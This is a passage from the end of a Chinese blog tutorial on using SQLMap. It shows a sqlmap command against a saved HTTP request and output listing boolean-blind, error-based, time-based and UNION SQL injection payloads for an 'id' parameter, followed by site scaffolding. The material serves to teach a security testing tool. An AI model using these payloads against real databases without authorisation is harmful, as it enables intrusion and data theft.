&gt; Request &gt; Entire Request &gt; 保存为request.txt</span><br>sqlmap <span class="hljs-literal">-r</span> request.txt <span class="hljs-literal">-p</span> id<br><br>[<span class="hljs-number">16</span>:<span class="hljs-number">55</span>:<span class="hljs-number">17</span>] [<span class="hljs-type">INFO</span>] parsing HTTP request from <span class="hljs-string">&#x27;request.txt&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">55</span>:<span class="hljs-number">18</span>] [<span class="hljs-type">INFO</span>] resuming back<span class="hljs-literal">-end</span> DBMS <span class="hljs-string">&#x27;mysql&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">55</span>:<span class="hljs-number">18</span>] [<span class="hljs-type">INFO</span>] testing connection to the target URL<br>sqlmap resumed the following injection point(s) from stored session:<br><span class="hljs-literal">---</span><br><span class="hljs-keyword">Parameter</span>: id (POST)<br>    <span class="hljs-built_in">Type</span>: boolean<span class="hljs-literal">-based</span> blind<br>    Title: Boolean<span class="hljs-literal">-based</span> blind - <span class="hljs-keyword">Parameter</span> replace (original value)<br>    Payload: id=(<span class="hljs-built_in">SELECT</span> (CASE WHEN (<span class="hljs-number">2937</span>=<span class="hljs-number">2937</span>) THEN <span class="hljs-number">1</span> <span class="hljs-keyword">ELSE</span> (...) <span class="hljs-keyword">END</span>))&amp;Submit=Submit<br><br>    <span class="hljs-built_in">Type</span>: error<span class="hljs-literal">-based</span><br>    Title: MySQL &gt;= <span class="hljs-number">5.6</span> AND error<span class="hljs-literal">-based</span> ..., ORDER BY or <span class="hljs-built_in">GROUP</span> BY clause (GTID_SUBSET)<br>    Payload: id=<span class="hljs-number">1</span> AND GTID_SUBSET(CONCAT(...),<span class="hljs-number">4380</span>)&amp;Submit=Submit<br><br>    <span class="hljs-built_in">Type</span>: time<span class="hljs-literal">-based</span> blind<br>    Title: MySQL &gt;= <span class="hljs-number">5.0</span>.<span class="hljs-number">12</span> AND time<span class="hljs-literal">-based</span> blind (query <span class="hljs-built_in">SLEEP</span>)<br>    Payload: id=<span class="hljs-number">1</span> AND (<span class="hljs-built_in">SELECT</span> <span class="hljs-number">5029</span> FROM (<span class="hljs-built_in">SELECT</span>(<span class="hljs-built_in">SLEEP</span>(<span class="hljs-number">5</span>)))JdIC)&amp;Submit=Submit<br><br>    <span class="hljs-built_in">Type</span>: UNION query<br>    Title: Generic UNION query (NULL) - <span class="hljs-number">2</span> columns<br>    Payload: id=<span class="hljs-number">1</span> UNION ALL <span class="hljs-built_in">SELECT</span> NULL,CONCAT(...)<span class="hljs-literal">--</span> -&amp;Submit=Submit<br><span class="hljs-literal">---</span><br></code></pre></td></tr></table></figure>
+
+
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" class="category-chain-item">测试工具</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%9B%AE%E6%A0%87URL/">#目标URL</a>
+      
+        <a href="/tags/%E6%B3%A8%E5%85%A5%E7%82%B9/">#注入点</a>
+      
+        <a href="/tags/%E5%AD%97%E6%AE%B5%E6%95%B0/">#字段数</a>
+      
+        <a href="/tags/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/">#联合查询</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SQLMap 的使用</div>
+      <div>https://stitch-top.github.io/2025/12/22/ce-shi-gong-ju/tt08-sqlmap/tt01-sqlmap-de-shi-yong/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Dr.626</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月22日 21:30:00</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                <i class="iconfont icon-nc"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                <i class="iconfont icon-sa"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/27/java/java07-servlet-san/" title="Servlet(三)">
+                        <span class="hidden-mobile">Servlet(三)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments">
+    
+  <div class="giscus"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('.giscus', function() {
+      // 获取当前页面的协议和域名，拼接 CSS 的绝对路径
+      var baseUrl = 'https://stitch-top.github.io'.replace(/\/$/, '');
+      var lightTheme = baseUrl + '/css/giscus-light.css';
+      var darkTheme = baseUrl + '/css/giscus-dark.css';
+
+      // 判断当前 Fluid 主题状态
+      var currentMode = document.documentElement.getAttribute('data-user-color-scheme');
+      var giscusTheme = currentMode === 'dark' ? darkTheme : lightTheme;
+
+      var options = {
+        'src': 'https://giscus.app/client.js',
+        'data-repo': 'stitch-top/stitch-top.github.io',
+        'data-repo-id': 'R_kgDOHJ03lw',
+        'data-category': 'General',
+        'data-category-id': 'DIC_kwDOHJ03l84C3tTM',
+        'data-mapping': 'pathname',
+        'data-strict': '0',
+        'data-reactions-enabled': '1',
+        'data-emit-metadata': '0',
+        'data-input-position': 'bottom',
+        'data-theme': giscusTheme,
+        'data-lang': 'zh-CN',
+        'crossorigin': 'anonymous',
+        'async': true
+      };
+
+      // 动态创建脚本
+      var s = document.createElement('script');
+      for (var key in options) {
+        s.setAttribute(key, options[key]);
+      }
+      var container = document.querySelector('.giscus');
+      container.appendChild(s);
+
+      // 监听 Fluid 主题切换事件，同步更新 Giscus
+      window.addEventListener('message', (event) => {
+        if (event.origin !== 'https://giscus.app') return;
+        // 这里的逻辑通常由 Giscus 内部处理，
+        // 但我们需要手动告诉 Giscus 切换主题，通过 postMessage 发送新配置
+      });
+
+      // 重点：当 Fluid 切换主题时，通知 Giscus
+      var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+          if (mutation.attributeName === "data-user-color-scheme") {
+            var themeMode = document.documentElement.getAttribute('data-user-color-scheme');
+            var updatedTheme = themeMode === 'dark' ? darkTheme : lightTheme;
+            var sendMessage = {
+              giscus: {
+                setConfig: {
+                  theme: updatedTheme
+                }
+              }
+            };
+            var iframe = document.querySelector('iframe.giscus-frame');
+            if (iframe && iframe.contentWindow) {
+              iframe.contentWindow.postMessage(sendMessage, 'https://giscus.app');
+            }
+          }
+        });
+      });
+      observer.observe(document.documentElement, { attributes: true });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-left: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="测试工具"
+        id="heading-7e2f62602068bab6246b886d7866dc56" role="tab" data-toggle="collapse" href="#collapse-7e2f62602068bab6246b886d7866dc56"
+        aria-expanded="true"
+      >
+        测试工具
+        <span class="list-group-count">(10)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-7e2f62602068bab6246b886d7866dc56"
+           role="tabpanel" aria-labelledby="heading-7e2f62602068bab6246b886d7866dc56">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2022/01/05/ce-shi-gong-ju/tt01-jmeter/tt01-jmeter-zu-jian/" title="JMeter 组件"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">JMeter 组件</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/06/27/ce-shi-gong-ju/tt01-jmeter/tt02-jmeter-jiao-ben/" title="JMeter 脚本"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">JMeter 脚本</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/03/02/ce-shi-gong-ju/tt02-fiddler/tt01-fiddler-mian-ban/" title="Fiddler 面板"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Fiddler 面板</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/05/10/ce-shi-gong-ju/tt03-charles/tt01-charles-gong-neng/" title="Charles 功能"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Charles 功能</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/07/21/ce-shi-gong-ju/tt04-postman/tt01-postman-jie-shao/" title="Postman 介绍"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Postman 介绍</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/09/02/ce-shi-gong-ju/tt05-adb-diao-shi-gong-ju/tt01-adb-shi-yong-ming-ling/" title="ADB 实用命令"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">ADB 实用命令</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/11/10/ce-shi-gong-ju/tt06-f12-kai-fa-zhe-gong-ju/tt01-f12-gong-neng-shuo-ming/" title="F12 功能说明"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">F12 功能说明</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/04/15/ce-shi-gong-ju/tt06-f12-kai-fa-zhe-gong-ju/tt02-f12-console-mian-ban/" title="F12 Console 面板"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">F12 Console 面板</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/01/11/ce-shi-gong-ju/tt07-ffmpeg/tt01-ffmpeg-ming-ling-xiang-jie/" title="FFmpeg 命令详解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">FFmpeg 命令详解</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/12/22/ce-shi-gong-ju/tt08-sqlmap/tt01-sqlmap-de-shi-yong/" title="SQLMap 的使用"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">SQLMap 的使用</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      <!--  <a><span>Copyright © 2021 - {current_year}</span></a> <i class="iconfont icon-love"></i> <a href="https://stitch-top.github.io" target="_blank" rel="nofollow noopener"><span>Dr.626</span></a>  -->
+       <a><span>Copyright © 2021 - 2026</span></a> <i class="iconfont icon-love"></i> <a href="https://stitch-top.github.io" target="_blank" rel="nofollow noopener"><span>Dr.626</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    <!-- GoatCounter 逻辑 -->
+    
+      <span id="goatcounter-site-pv-container">
+        📈 总访问量 
+        <span id="goatcounter-site-pv">...</span>
+         次
+      </span>
+    
+    
+    <script data-goatcounter="https://stitch.goatcounter.com/count"
+            async src="//gc.zgo.at/count.js"></script>
+    
+    <script>
+      window.addEventListener('load', function() {
+        var id = 'stitch';
+        // 尝试使用 TOTAL.json 获取全站总计
+        var url = 'https://' + id + '.goatcounter.com/counter/TOTAL.json';
+        
+        var request = new XMLHttpRequest();
+        request.open('GET', url, true);
+        request.onload = function() {
+          if (this.status >= 200 && this.status < 400) {
+            try {
+              var data = JSON.parse(this.response);
+              // GoatCounter 返回的可能是 "1,234" 这种字符串
+              var count = data.count.replace(/[^0-9]/g, ''); 
+              var el = document.getElementById('goatcounter-site-pv');
+              if (el) {
+                el.innerText = count;
+              }
+            } catch (e) {
+              console.error("GoatCounter 数据解析失败:", e);
+            }
+          } else {
+            console.error("GoatCounter 请求失败，状态码:", this.status);
+          }
+        };
+        request.onerror = function() {
+          console.error("GoatCounter 请求连接错误");
+        };
+        request.send();
+      });
+    </script>
+    
+  
+</div>
+
+  
+  
+  
+  
+  <!-- 添加网站运行时间 -->
+  <div class="footer-content">
+    <div>
+      <span id="timeDate">载入天数...</span>
+      <span id="times">载入时分秒...</span>
+      <script>
+      var now = new Date();
+      function createtime(){
+          var grt= new Date("01/01/2021 00:00:00");   //此处修改你的建站时间或者网站上线时间
+          now.setTime(now.getTime()+250);
+          days = (now - grt ) / 1000 / 60 / 60 / 24;
+          dnum = Math.floor(days);
+          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+          hnum = Math.floor(hours);
+          if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+          }
+          minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+          mnum = Math.floor(minutes);
+          if(String(mnum).length ==1 ){
+                    mnum = "0" + mnum;
+          }
+          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+          snum = Math.round(seconds);
+          if(String(snum).length ==1 ){
+                    snum = "0" + snum;
+          }
+          document.getElementById("timeDate").innerHTML = "本站已安全运行&nbsp"+dnum+"&nbsp天";
+          document.getElementById("times").innerHTML = hnum + "&nbsp小时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+      }
+      setInterval("createtime()", 250);
+      </script>
+    </div>
+  </div>
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.7.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    
+      <script  src="/js/img-lazyload.js" ></script>
+    
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://cdn.staticfile.org/tocbot/4.21.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://cdn.staticfile.org/clipboard.js/2.0.11/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://cdn.staticfile.org/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
